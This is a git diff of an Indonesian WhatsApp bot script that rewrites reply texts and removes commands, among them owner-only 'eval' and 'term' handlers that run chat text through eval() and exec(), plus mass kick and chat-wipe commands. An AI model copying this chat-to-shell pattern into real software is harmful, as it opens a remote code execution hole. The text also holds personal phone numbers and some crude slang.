               freply(`*Subcribe YT Owner :*\n https://m.youtube.com/channel/UC4mrtQKsM0i31zFrd01OsRg`)
               break
-case 'y': 
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-freply('Y')
-break
         case 'masukandata': 
         if (!isRegist) return freply(mess.regist)
         if (isBanned) return freply(mess.banned)
-             freply(`*「BOT MELAYANI」*\n\n━━━━━━━━━━━━━━━━━━━━\n\nMASUKKANA DATA BERIKUT\n*•NAMA GAME:*\n*•ID GAME:*\n*•USER NAME:*\n━━━━━━━━━━━━━━━━━━━━\n*NOTE:*\n*1.* _JANGAN LUPA BUKTI TRXNYA_\n*2.* _OTOMATIS PESANAN_\n_LANSUNG DI PROSES_\n*3.* _PESANAN ANDA DI PROSES_\n_OLEH_\n\n   *© ʙʏ ʀᴀᴍᴅᴀɴɪ ᴏғғɪᴄɪᴀʟ*\n\n_JIKA PESANAN ANDA LOW_\n_PROSES MOHON BERSABAR_\nwa.me/6283146208804`)
+             freply(`*「BOT MELAYANI」*\n\n━━━━━━━━━━━━━━━━━━━━\n\nMASUKKANA DATA BERIKUT\n*•NAMA GAME:*\n*•ID GAME:*\n*•USER NAME:*\n━━━━━━━━━━━━━━━━━━━━\n*NOTE:*\n*1.* _JANGAN LUPA BUKTI SCREENSHOT NYA_\n*2.* _OTOMATIS PESANAN_\n_LANSUNG DI PROSES_\n*3.* _PESANAN ANDA DI PROSES_\n_OLEH_\n\n   *© ʙʏ ᴡᴀɴᴢʙᴏᴛ*\n\n_JIKA PESANAN ANDA LOW_\n_PROSES MOHON BERSABAR_\nwa.me/6283804343232`)
               break
       case 'ping':
       case 'speed': 
@@ -5055,37 +2483,7 @@ teks = `\`\`\`BOT STATISTICS\`\`\`
              } else {
              for (let _ of anu) {
 Ramdani.sendMessage(_.jid, 
-			{"contentText": `*「 SIARAN VIE BOTZ」*\n\n*NAME :* *WanzBOT*\n*NOMER :* *wa.me/${sender.split('@')[0]}*\n*ISI PESAN :* ${body.slice(4)}*`,
-			"footerText": '© ʙʏ ᴡᴀɴᴢʙᴏᴛ',
-			"buttons": [
-			{"buttonId": `${prefix}menu`,
-			"buttonText": {"displayText": "MENU"
-			},"type": "RESPONSE"}
-			], "headerType": 1,
-			}, MessageType.buttonsMessage )
-}
-             freply('Suksess broadcast')
-}
-             break
-      case 'bcgc':
-      case 'bcgroup':
-      case 'broadcastgroup': 
-             if (!isRegist) return freply(mess.regist)
-             if (isBanned) return freply(mess.banned)
-             if (!isOwner) return  freply(mess.only.owner)
-             if (args.length < 1) return freply('teks?')
-             anu = await Ramdani.chats.all()
-             if (isMedia && !mek.message.videoMessage || isQuotedImage) {
-             const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
-             bc = await Ramdani.downloadMediaMessage(encmedia)
-             for (let _ of anu) {
-             Ramdani.sendMessage(_.jid, bc, image, {quoted:freply,caption: `*「 PESAN SIARAN BOT 」*\n\n${body.slice(4)}`})
-}
-             freply('Suksess broadcast')
-             } else {
-             for (let _ of anu) {
-Ramdani.sendMessage(_.jid, 
-			{"contentText": `*「 SIARAN VIE BOTZ」*\n\n*NAME :* *WanzBOT*\n*NOMER :* *wa.me/${sender.split('@')[0]}*\n*ISI PESAN :* ${body.slice(4)}*`,
+			{"contentText": `*「 SIARAN VIE BOTZ」*\n\n*NAME :* *WanzBOT*\n*NOMER :* *wa.me/${sender.split('@')[0]}*\n*ISI PESAN :* ${body.slice(4)}`,
 			"footerText": '© ʙʏ ᴡᴀɴᴢʙᴏᴛ',
 			"buttons": [
 			{"buttonId": `${prefix}menu`,
@@ -5118,24 +2516,13 @@ Ramdani.sendMessage(_.jid,
 					case 'setppbot': 
                     if (!isRegist) return freply(mess.regist)
                     if (isBanned) return freply(mess.banned)
-					if (!isOwner) return freply(ind.ownerb())
+					if (!isOwner) return freply('*Only Owner bot*')
 					Ramdani.updatePresence(from, Presence.composing) 
 					if (!isQuotedImage) return freply(`Kirim gambar dengan caption ${prefix}setppbot atau tag gambar yang sudah dikirim`)
 					enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
 					media = await Ramdani.downloadAndSaveMediaMessage(enmedia)
 					await Ramdani.updateProfilePicture(botNumber, media)
-					freply('Makasih profil barunya😗')
-					break 
-		case 'setppbot2': 
-                    if (!isRegist) return freply(mess.regist)
-                    if (isBanned) return freply(mess.banned)
-				    if (!isOwner) return freply('*Only Owner bot*')
-					Ramdani.updatePresence(from, Presence.composing) 
-					if (!isQuotedImage) return freply(`Kirim gambar dengan caption ${prefix}setppbot atau tag gambar yang sudah dikirim`)
-					enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
-					media = await Ramdani.downloadAndSaveMediaMessage(enmedia)
-					await Ramdani.updateProfilePicture(botNumber, media)
-					freply('Makasih profil barunya😗')
+					freply('Done')
 					break 
 					case 'public': 
                 if (!isRegist) return freply(mess.regist)
@@ -5158,21 +2545,6 @@ Ramdani.sendMessage(_.jid,
                 fs.writeFileSync('./config/setting.json', JSON.stringify(setting, null, 2))
                 freply(`「 *SELF-MODE* 」`)
                 break
-case 'public2':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-if (!isOwner) return freply(mess.only.ownerB)
-public = true
-fdanzz('*LANGUAGE ENGLISH*\n_Success change to public mode_\n\n*BAHASA INDONESIA*\n_Berhasil mengubah ke mode publik_')
-break
-case 'self2':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-if (!isOwner) return freply(mess.only.ownerB)
-public = false
-fdanzz('*LANGUAGE ENGLISH*\n_Success change to self mode_\n\n*BAHASA INDONESIA*\n_Berhasil mengubah ke mode self_')
-freply('*⌜ SELF MODE ⌟*')
-break 
                     case 'ban':
                     case 'banned':
                     if (!isRegist) return freply(mess.regist)
@@ -5251,77 +2623,6 @@ break
              expect200: true })
              freply('Berhasil Masuk Grup')
              break
-case 'join3':
-            if (!isRegist) return freply(mess.regist)
-            if (isBanned) return freply(mess.banned)
-            if (!isOwner) return freply(mess.only.ownerB)
-            try {
-            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return freply(mess.Iv)
-            hen = args[0]
-            if (!q) return freply('Masukan link group')
-            var codeInvite = hen.split('https://chat.whatsapp.com/')[1]
-            if (!codeInvite) return fakeitem('pastikan link sudah benar!')
-            var response = await Ramdani.acceptInvite(codeInvite)
-            fakeitem('SUKSES')
-            } catch {
-            fakeitem('LINK ERROR!')
-            }
-        break
-      case 'eval': 
-             if (!isRegist) return freply(mess.regist)
-             if (isBanned) return freply(mess.banned)
-             try {
-             if (!isOwner) return
-             sy = args.join(' ')
-             return eval(sy)
-             } catch(e) {
-             freply(`${e}`)
-}
-             break
-      case 'getquoted': 
-             if (!isRegist) return freply(mess.regist)
-             if (isBanned) return freply(mess.banned)
-             freply(JSON.stringify(mek.message.extendedTextMessage.contextInfo, null, 3))
-             break
-      case 'clearall': 
-             if (!isRegist) return freply(mess.regist)
-             if (isBanned) return freply(mess.banned)
-             if (!isOwner) return  freply(mess.only.owner)
-             anu = await Ramdani.chats.all()
-             Ramdani.setMaxListeners(25)
-             for (let _ of anu) {
-             Ramdani.deleteChat(_.jid)
-}
-             freply('Sukses delete all chat :)')
-             break
-      case 'term': 
-             if (!isRegist) return freply(mess.regist)
-             if (isBanned) return freply(mess.banned)
-             if (!isOwner) return
-             if (!q) return
-             exec(q, (err, stdout) => {
-             if (err) return freply(`${err}`)
-             if (stdout) {
-             freply(stdout)
-}
-})
-             break 
-      case 'shutdown': 
-             if (!isRegist) return freply(mess.regist)
-             if (isBanned) return freply(mess.banned)
-             if (!isOwner) return 
-             freply(`Bye...`)
-             await sleep(3000)
-             process.exit()
-             break
-      case 'start': 
-             if (!isRegist) return freply(mess.regist)
-             if (isBanned) return freply(mess.banned)
-             if (!isOwner) return 
-             freply(`OTEWE MENGHIDUPKAN MESIN??`)
-             await sleep(3000)
-             process.exit()
-             break             
       case 'restart': 
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
@@ -5336,7 +2637,7 @@ case 'join3':
              if (!isOwner) return  freply(mess.only.owner)
              let totalgroup = Ramdani.chats.array.filter(u => u.jid.endsWith('@g.us')).map(u => u.jid)
              for (let id of totalgroup) {
-             sendMess(id, 'Byee', null)
+             sendMess(id, 'Owner suruh aku keluar dari semua grup, dadah semuanya', null)
              await sleep(3000)
              Ramdani.groupLeave(id)
 }
@@ -5357,149 +2658,6 @@ case 'join3':
 						fs.unlinkSync(ran)
 					})
 				break 
-case 'addstik': 
-             if (!isRegist) return freply(mess.regist)
-             if (isBanned) return freply(mess.banned)
-	         if (!isOwner) return freply(mess.only.owner)
-				if (!isQuotedSticker) return freply('Reply stiker nya')
-				svst = body.slice(9)
-				if (!svst) return freply('Nama sticker nya apa?')
-				boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
-				delb = await Ramdani.downloadMediaMessage(boij)
-				setiker.push(`${svst}`)
-				fs.writeFileSync(`./temp/stick/${svst}.webp`, delb)
-				fs.writeFileSync('./temp/stick.json', JSON.stringify(setiker))
-				Ramdani.sendMessage(from, `Sukses Menambahkan Sticker\nCek dengan cara ${prefix}liststik`, MessageType.text, { quoted: troli})
-				break
-case 'addimg': 
-                if (!isRegist) return freply(mess.regist)
-                if (isBanned) return freply(mess.banned)
-				if (!isOwner) return freply(mess.only.owner)
-				if (!isQuotedImage) return freply('Reply imagenya')
-				svst = body.slice(8)
-				if (!svst) return freply('Nama imagenya apa')
-				boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
-				delb = await Ramdani.downloadMediaMessage(boij)
-				imagenye.push(`${svst}`)
-				fs.writeFileSync(`./temp/foto/${svst}jpeg`, delb)
-				fs.writeFileSync('./temp/image.json', JSON.stringify(imagenye))
-				Ramdani.sendMessage(from, `Sukses Menambahkan image\nCek dengan cara ${prefix}listimg`, MessageType.text, { quoted: troli})
-				break
-				
-case 'addvid': 
-                if (!isRegist) return freply(mess.regist)
-                if (isBanned) return freply(mess.banned)
-				if (!isOwner) return freply(mess.only.owner)
-				if (!isQuotedVideo) return freply('Reply vidionya')
-				svst = body.slice(8)
-				if (!svst) return freply('Nama vidionya apa')
-				boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
-				delb = await Ramdani.downloadMediaMessage(boij)
-				imagenye.push(`${svst}`)
-				fs.writeFileSync(`./temp/video/${svst}.mp4`, delb)
-				fs.writeFileSync('./temp/video.json', JSON.stringify(imagenye))
-				Ramdani.sendMessage(from, `Sukses Menambahkan video\nCek dengan cara ${prefix}listvideo`, MessageType.text, { quoted: troli })
-				break
-			        
-case 'addvn': 
-                if (!isRegist) return freply(mess.regist)
-                if (isBanned) return freply(mess.banned)
-				if (!isOwner) return freply(mess.only.owner)
-				if (!isQuotedAudio) return freply('Reply vnnya')
-				svst = body.slice(7)
-				if (!svst) return freply('Nama audionya apa')
-				boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
-				delb = await Ramdani.downloadMediaMessage(boij)
-				audionye.push(`${svst}`)
-				fs.writeFileSync(`./temp/audio/${svst}.mp3`, delb)
-				fs.writeFileSync('./temp/vn.json', JSON.stringify(audionye))
-				Ramdani.sendMessage(from, `Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`, MessageType.text, { quoted: troli})
-				break 
-case 'liststik': 
-             if (!isRegist) return freply(mess.regist)
-             if (isBanned) return freply(mess.banned)
-				teks = '*Sticker list :*\n\n'
-				for (let awokwkwk of setiker) {
-					teks += `- ${awokwkwk}\n`
-				}
-				teks += `\n*Total : ${setiker.length}*`
-				Ramdani.sendMessage(from, teks.trim(), extendedText, { quoted: troli, contextInfo: { "mentionedJid": setiker } })
-				break				
-case 'listimg': 
-             if (!isRegist) return freply(mess.regist)
-             if (isBanned) return freply(mess.banned)
-				teks = '*Image list :*\n\n'
-				for (let awokwkwk of imagenye) {
-					teks += `- ${awokwkwk}\n`
-				}
-				teks += `\n*Total : ${imagenye.length}*`
-				Ramdani.sendMessage(from, teks.trim(), extendedText, { quoted: troli, contextInfo: { "mentionedJid": setiker } })
-				break				
-case 'listvid': 
-             if (!isRegist) return freply(mess.regist)
-             if (isBanned) return freply(mess.banned)
-				teks = '*List Video :*\n\n'
-				for (let awokwkwk of videonye) {
-					teks += `- ${awokwkwk}\n`
-				}
-				teks += `\n*Total : ${videonye.length}* `
-				Ramdani.sendMessage(from, teks.trim(), extendedText, { quoted: troli, contextInfo: { "mentionedJid": imagenye } })
-				break				
-case 'listvn': 
-             if (!isRegist) return freply(mess.regist)
-             if (isBanned) return freply(mess.banned)
-				teks = '*List Vn:*\n\n'
-				for (let awokwkwk of audionye) {
-					teks += `- ${awokwkwk}\n`
-				}
-				teks += `\n*Total : ${audionye.length}*`
-				Ramdani.sendMessage(from, teks.trim(), extendedText, { quoted: troli, contextInfo: { "mentionedJid": audionye } })
-				break	
-case 'getstik': 
-             if (!isRegist) return freply(mess.regist)
-             if (isBanned) return freply(mess.banned)
-				namastc = body.slice(9)
-				try {
-				result = fs.readFileSync(`./temp/stick/${namastc}.webp`)
-				Ramdani.sendMessage(from, result, sticker,{quoted:troli})
-				} catch {
-				  freply('Pack tidak terdaftar')
-				}
-				break				
-case 'getimg': 
-             if (!isRegist) return freply(mess.regist)
-             if (isBanned) return freply(mess.banned)
-				namastc = body.slice(8)
-				try {
-				buffer = fs.readFileSync(`./temp/foto/${namastc}.jpeg`)
-				Ramdani.sendMessage(from, buffer, image, { quoted: troli, caption: `Result From Database : ${namastc}.jpeg` })
-				} catch {
-				  freply('Pack tidak terdaftar')
-				}
-				break
-				
-case 'getvid': 
-             if (!isRegist) return freply(mess.regist)
-             if (isBanned) return freply(mess.banned)
-				namastc = body.slice(8)
-				try {
-				buffer = fs.readFileSync(`./temp/video/${namastc}.mp4`)
-				Ramdani.sendMessage(from, buffer, video, { quoted: troli, caption: `Result From Database : ${namastc}.mp4` })
-				} catch {
-				  freply('Pack tidak terdaftar')
-				}
-				break				
-case 'getvn': 
-             if (!isRegist) return freply(mess.regist)
-             if (isBanned) return freply(mess.banned)
-				namastc = body.slice(7)
-				try {
-				buffer = fs.readFileSync(`./temp/audio/${namastc}.mp3`)
-				Ramdani.sendMessage(from, buffer, audio, { mimetype: 'audio/mp4', quoted: troli, ptt: true })
-				} catch {
-				  freply('Pack tidak terdaftar')
-				}
-				break
 //------------------< G R U P >-------------------
 case 'linkgc': 
              if (!isRegist) return freply(mess.regist)
@@ -5532,7 +2690,7 @@ case 'linkgc':
       case 'promote': 
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
-             freply('🗿')
+             freply('Selamat ya dah di promote')
              if (!isGroupAdmins) return freply(mess.only.admin)
              if (mek.message.extendedTextMessage === null || mek.message.extendedTextMessage === undefined) return;
              if (mek.message.extendedTextMessage.contextInfo.participant === undefined) {
@@ -5554,7 +2712,7 @@ case 'linkgc':
       case 'demote': 
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
-             freply('🗿')
+             freply('Selamat ya dah di demote')
              if (!isGroupAdmins) return freply(mess.only.admin)
              if (mek.message.extendedTextMessage === null || mek.message.extendedTextMessage === undefined) return;
              if (mek.message.extendedTextMessage.contextInfo.participant === undefined) {
@@ -5573,17 +2731,6 @@ case 'linkgc':
              Ramdani.groupDemoteAdmin(from, [entah])
 }
              break
-       case 'setgrupname': 
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-              if (!isGroupAdmins) return freply(mess.only.admin)
-              if (!isGroup) return freply(mess.only.group)
-              if (!isBotGroupAdmins) return 
-              if (args.length == 0) return freply(`Penggunaan ${prefix}setgrupname name`)
-              Ramdani.groupUpdateSubject(from, q)
-             .then((res) => freply(jsonformat(res)))
-             .catch((err) => freply(jsonformat(err)))
-              break
        case 'setdesc': 
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
@@ -5595,7 +2742,7 @@ case 'linkgc':
              .then((res) => freply(jsonformat(res)))
              .catch((err) => freply(jsonformat(err)))
               break
-       case 'setppgrup': 
+       case 'setppgc': 
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
               if (!isGroupAdmins) return freply(mess.only.admin)
@@ -5611,26 +2758,6 @@ case 'linkgc':
               freply(`Kirim atau tag gambar dengan caption ${prefix}setppgrup`)
 }
               break
-       case 'me':
-       case 'profile': 
-             if (!isRegist) return freply(mess.regist)
-             if (isBanned) return freply(mess.banned)
-              let Levelnye = level.getLevelingLevel(sender, _level)
-              let Xpluu = level.getLevelingXp(sender, _level)
-              let requiredXplu = 10 * Math.pow(Levelnye, 2) + 50 * Levelnye + 100
-              Ramdani.updatePresence(from, Presence.composing)
-              try {
-              profil = await Ramdani.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
-              } catch {
-              profil = errorImg
-}
-              thu = await Ramdani.getStatus(`${sender.split('@')[0]}@s.whatsapp.net`, MessageType.text)
-              me = Ramdani.user
-              uptime = process.uptime()
-              profile = `-----[ *USER INFO* ]-----\n\n➸ *Username:* ${pushname}\n➸ *Status:* ${thu.status}\n➸ *Premium*: ${isPremium ? 'Ya' : 'No'}\n➸ *Admin*: ${isGroupAdmins ? 'Ya' : 'No'}\n➸ *Prefix :* Multi Prefix\n\n=_=_=_=_=_=_=_=_=_=_=_=_=\n\nYour progress:\n➸ *Level*: ${Levelnye}\n➸ *XP*: ${Xpluu} / ${requiredXplu}`
-              buff = await getBuffer(profil)
-              Ramdani.sendMessage(from, buff, image, {quoted: freply, caption: profile})
-              break
        case 'afk':  
               if (!isRegist) return freply(mess.regist)
               if (isBanned) return freply(mess.banned)
@@ -5638,10 +2765,10 @@ case 'linkgc':
               if (isAfkOn) return freply('Woe Kalo Mau Afk Jangan Nimbrung di sini')
               const reason = q ? q : 'Nothing.'
               afk.addAfkUser(sender, time, reason, _afk)
-              const aluty = `Fitur AFK berhasil *diaktifkan!*\n\n➸ *Ussername*: ${pushname}\n➸ *Alasan*: ${reason}`
+              const aluty = `*AFK MODE ON!*\n\n➸ *Ussername*: ${pushname}\n➸ *Alasan*: ${reason}`
               freply(aluty)
               break
-       case 'infogrup':
+       case 'infogc':
        case 'grupinfo':
        case 'groupinfo': 
              if (!isRegist) return freply(mess.regist)
@@ -5661,20 +2788,12 @@ case 'linkgc':
               if (!isGroupAdmins) return freply(mess.only.admin)
               if (!isGroup) return freply(mess.only.group)
               let arr = [];
-              let txti = `*[ TAG ALL ]*\n\n${q ? q : ''}\n\n`
+              let txti = `*[ TAG ALL ]*\n\n*NAME :* *${pushname}* \n*NOMER :* *wa.me/${sender.split('@')[0]}* \n*ISI PESAN :* ${q ? q : ''}\n\n`
               for (let i of groupMembers){
               txti += `=> @${i.jid.split("@")[0]}\n`
               arr.push(i.jid)
 }
               mentions(txti, arr, true)
-              break
-       case 'kickall': // Anti Banned 
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-              if (!isGroupAdmins) return freply(mess.only.admin)
-              for (let i of groupMembers) {
-              await kickMember(from, [i.jid])
-}
               break
        case 'leave': 
               if (!isRegist) return freply(mess.regist)
@@ -5739,7 +2858,7 @@ case 'linkgc':
 }
              break
 //------------------< Fun >-------------------
-       case 'Rizwan Ganteng':
+       case 'wangy':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
               if (!q) return
@@ -5773,14 +2892,7 @@ case 'linkgc':
               freply(toxic)
 })
               break
-        case 'citacita':
-             if (!isRegist) return freply(mess.regist)
-             if (isBanned) return freply(mess.banned)
-              const cita =['http://piyobot.000webhostapp.com/citacita1.mp3','http://piyobot.000webhostapp.com/citacita2.mp3','http://piyobot.000webhostapp.com/citacita3.mp3','http://piyobot.000webhostapp.com/citacita4.mp3','http://piyobot.000webhostapp.com/citacita5.mp3','http://piyobot.000webhostapp.com/citacita6.mp3','http://piyobot.000webhostapp.com/citacita7.mp3','http://piyobot.000webhostapp.com/citacita8.mp3','http://piyobot.000webhostapp.com/citacita9.mp3','http://piyobot.000webhostapp.com/citacita10.mp3','http://piyobot.000webhostapp.com/citacita11.mp3','http://piyobot.000webhostapp.com/citacita12.mp3','http://piyobot.000webhostapp.com/citacita13.mp3','http://piyobot.000webhostapp.com/citacita14.mp3','http://piyobot.000webhostapp.com/citacita15.mp3','http://piyobot.000webhostapp.com/citacita16.mp3','http://piyobot.000webhostapp.com/citacita17.mp3','http://piyobot.000webhostapp.com/citacita18.mp3','http://piyobot.000webhostapp.com/citacita19.mp3','http://piyobot.000webhostapp.com/citacita20.mp3','http://piyobot.000webhostapp.com/citacita21.mp3','http://piyobot.000webhostapp.com/citacita22.mp3','http://piyobot.000webhostapp.com/citacita23.mp3','http://piyobot.000webhostapp.com/citacita24.mp3','http://piyobot.000webhostapp.com/citacita25.mp3','http://piyobot.000webhostapp.com/citacita26.mp3','http://piyobot.000webhostapp.com/citacita27.mp3','http://piyobot.000webhostapp.com/citacita28.mp3','http://piyobot.000webhostapp.com/citacita29.mp3','http://piyobot.000webhostapp.com/citacita30.mp3','http://piyobot.000webhostapp.com/citacita31.mp3','http://piyobot.000webhostapp.com/citacita32.mp3','http://piyobot.000webhostapp.com/citacita33.mp3','http://piyobot.000webhostapp.com/citacita34.mp3','http://piyobot.000webhostapp.com/citacita35.mp3']
-              const cita3 = cita[Math.floor(Math.random() * cita.length)]
-              cita2 = await getBuffer(cita3)
-              Ramdani.sendMessage(from, cita2, audio,{mimetype: 'audio/mp4', ptt:true, quoted: mek})
-              break
+//seru seruan
        case 'apakah':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
@@ -5815,32 +2927,6 @@ case 'linkgc':
               const can =['10','30','20','40','50','60','70','62','74','83','97','100','29','94','75','82','41','39']
               const tik = can[Math.floor(Math.random() * can.length)]
               Ramdani.sendMessage(from, '*Pertanyaan :* '+cantik+'\n*Jawaban :* '+ tik+'%', text, { quoted: mek })
-              break
-       case 'cekwatak':
-             if (!isRegist) return freply(mess.regist)
-             if (isBanned) return freply(mess.banned)
-              var namao = pushname
-              var prfx = await Ramdani.getProfilePicture(sender)
-              const watak = ['top deh pokoknya','penyayang','pemurah','Pemarah','Pemaaf','Penurut','Baik','baperan','Baik-Hati','penyabar','UwU','Suka Membantu']
-              const wtk = watak[Math.floor(Math.random() * (watak.length))]
-              const ratenyaasu = ['100%','95%','90%','85%','80%','75%','70%','65%','60%','55%','50%','45%','40%','35%','30%','25%','20%','15%','10%','5%']
-              const akhlak = ratenyaasu[Math.floor(Math.random() * (ratenyaasu.length))]
-              const sifat = ['Penolong','Suka Membantu','Saling Menolong','Perhatian','Ngak Cuek','Romantis','Dermawan','Cool','Peduli Kepada Sesama','Suka Berkata Kasar']
-              const sft = sifat[Math.floor(Math.random() * (sifat.length))]
-              const hobby = ['Memasak','Membantu Atok','Mabar','Nobar','Coli','Colmek','Sosmedtan','Membantu Orang lain','Nonton Anime','Nonton Drakor','Naik Motor','Nyanyi','Menari','Bertumbuk','Menggambar','Foto fotoan Ga jelas','Maen Game','Berbicara Sendiri']
-              const hby = hobby[Math.floor(Math.random() * (hobby.length))]
-              const kelebihan = ['Soleh dan Soleha','Pintar','Rajin','Teladan']
-              const klbh = kelebihan[Math.floor(Math.random() * (kelebihan.length))]
-              const tipe = ['cool','idaman','Alami','Keren','Ideal','Dia Bamget','normal','elite','epic','Legend']
-              const typo = tipe[Math.floor(Math.random() * (tipe.length))]
-              await freply(`[ INTROGASI SUKSES ]\n\n[Nama]:${namao}\n\n[Watak]:${wtk}\n\n[Akhlak✨]:${akhlak}\n\n[Sifat]:${sft}\n\n[Hobby]:${hby}\n\n[Tipe]:${typo}\n\n[Kelebihan]:${klbh}\n\nNote\n\n_ini hanya main main_`)
-              break
-       case 'hobby':
-             if (!isRegist) return freply(mess.regist)
-             if (isBanned) return freply(mess.banned)
-              hobby = body.slice(1)
-              const by = hobby[Math.floor(Math.random() * hobby.length)]
-              Ramdani.sendMessage(from, 'Pertanyaan : *'+hobby+'*\n\nJawaban : '+ by, text, { quoted: mek })
               break
        case 'bisakah':
              if (!isRegist) return freply(mess.regist)
@@ -6000,7 +3086,7 @@ case 'linkgc':
               if (isBanned) return freply(mess.banned)
               if (args.length < 1) return freply(`Ketik ${prefix}bugreport [fiturnya] [Error Nya Gimana]`) 
               teks = args.join(' ')
-              freply('Terima Kasih Telah Melaporkan Bug Pada Owner, Jika Itu Sekedar Iseng Maka Akan Di Ban Oleh Bot!')
+              freply('GUNAKAN REPORT SEBAIK MUNGKIN, MISAL MENANYAKAN TENTANG BOT ATAU MELAPORKAN BUG BOT')
               Ramdani.sendMessage('6283804343232@s.whatsapp.net',`*REPORT*\n*Nomer Pelaku:* wa.me/${sender.split('@')[0]}\n*Bug Report:* ${teks}`, text)
               break
        case 'readall':
@@ -6013,161 +3099,6 @@ case 'linkgc':
               console.log(totalchat.length)
               break	
               
-//-------------------< islam menu >--------------------
-
-case 'kisahnabi':
-                    if (!isRegist) return freply(mess.regist)
-                    if (isBanned) return freply(mess.banned)
-                    if (args.length == 0) return freply(`Example: ${prefix + command} Muhammad`)
-                    query = args.join(" ")
-                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/kisahnabi/${query}?apikey=${lolhumanapi}`)
-                    get_result = get_result.result
-                    ini_txt = `Name : ${get_result.name}\n`
-                    ini_txt += `Lahir : ${get_result.thn_kelahiran}\n`
-                    ini_txt += `Umur : ${get_result.age}\n`
-                    ini_txt += `Tempat : ${get_result.place}\n`
-                    ini_txt += `Story : \n${get_result.story}`
-                    freply(ini_txt)
-                    break
-case 'jadwalsholat':
-                    if (!isRegist) return freply(mess.regist)
-                    if (isBanned) return freply(mess.banned)
-                    if (args.length == 0) return freply(`Example: ${prefix + command} Yogyakarta`)
-                    daerah = args.join(" ")
-                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/sholat/${daerah}?apikey=${lolhumanapi}`)
-                    get_result = get_result.result
-                    ini_txt = `Wilayah : ${get_result.wilayah}\n`
-                    ini_txt += `Tanggal : ${get_result.tanggal}\n`
-                    ini_txt += `Sahur : ${get_result.sahur}\n`
-                    ini_txt += `Imsak : ${get_result.imsak}\n`
-                    ini_txt += `Subuh : ${get_result.subuh}\n`
-                    ini_txt += `Terbit : ${get_result.terbit}\n`
-                    ini_txt += `Dhuha : ${get_result.dhuha}\n`
-                    ini_txt += `Dzuhur : ${get_result.dzuhur}\n`
-                    ini_txt += `Ashar : ${get_result.ashar}\n`
-                    ini_txt += `Maghrib : ${get_result.imsak}\n`
-                    ini_txt += `Isya : ${get_result.isya}`
-                    freply(ini_txt)
-                    break  
-             case 'listsurah':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/quran?apikey=${lolhumanapi}`)
-                    get_result = get_result.result
-                    ini_txt = 'List Surah:\n'
-                    for (var x in get_result) {
-                        ini_txt += `${x}. ${get_result[x]}\n`
-                    }
-                    freply(ini_txt)
-                    break                                              
-case 'alquran':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-                    if (args.length < 1) return freply(`Example: ${prefix + command} 18 or ${prefix + command} 18/10 or ${prefix + command} 18/1-10`)
-                    urls = `http://api.lolhuman.xyz/api/quran/${args[0]}?apikey=${lolhumanapi}`
-                    quran = await fetchJson(urls)
-                    result = quran.result
-                    ayat = result.ayat
-                    ini_txt = `QS. ${result.surah} : 1-${ayat.length}\n\n`
-                    for (var x of ayat) {
-                        arab = x.arab
-                        nomor = x.ayat
-                        latin = x.latin
-                        indo = x.indonesia
-                        ini_txt += `${arab}\n${nomor}. ${latin}\n${indo}\n\n`
-                    }
-                    ini_txt = ini_txt.replace(/<u>/g, "").replace(/<\/u>/g, "")
-                    ini_txt = ini_txt.replace(/<strong>/g, "").replace(/<\/strong>/g, "")
-                    ini_txt = ini_txt.replace(/<u>/g, "").replace(/<\/u>/g, "")
-                    freply(ini_txt)
-                    break
-case 'asmaulhusna':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/asmaulhusna?apikey=${lolhumanapi}`)
-                    get_result = get_result.result
-                    ini_txt = `No : ${get_result.index}\n`
-                    ini_txt += `Latin: ${get_result.latin}\n`
-                    ini_txt += `Arab : ${get_result.ar}\n`
-                    ini_txt += `Indonesia : ${get_result.id}\n`
-                    ini_txt += `English : ${get_result.en}`
-                    freply(ini_txt)
-                    break
- case 'alquranaudio':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-                    if (args.length == 0) return freply(`Example: ${prefix + command} 18 or ${prefix + command} 18/10`)
-                    surah = args[0]
-                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/${surah}?apikey=${lolhumanapi}`)
-                    Ramdani.sendMessage(from, ini_buffer, audio, { quoted: mek, mimetype: Mimetype.mp4Audio })      
-                    break                                         
-//------------------< serti menu >-------------------   
-case 'sertitolol': 				
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-				if (args.length < 1) return freply(`Textnya Mana Cuy?\n*Contoh ${prefix}tololserti KURR GAMTENG`)
-				ct = body.slice(12)
